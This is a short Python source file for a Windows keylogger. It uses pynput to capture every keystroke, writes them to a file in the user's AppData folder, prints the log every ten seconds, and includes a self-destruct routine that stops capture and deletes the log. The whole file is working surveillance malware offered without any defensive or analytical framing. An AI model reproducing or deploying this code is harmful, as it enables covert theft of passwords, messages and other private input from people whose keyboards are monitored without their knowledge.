import os
from pynput.keyboard import Listener
import time
import threading


class Keylogger():
    keys = []
    flag = 0
    count = 0
    path = os.environ['appdata'] +'\\keylogger.txt'
    # path = 'keylogger.txt'

    def pressed(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_file(self):
        with open(self.path, 'rt') as f:
            return f.read()


    def write_file(self, keyslist):
        with open(self.path, 'a') as f:
            for key in keyslist:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)
    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.pressed) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_file()
        print(logs)
        #keylog.self_destruct()
    t.join()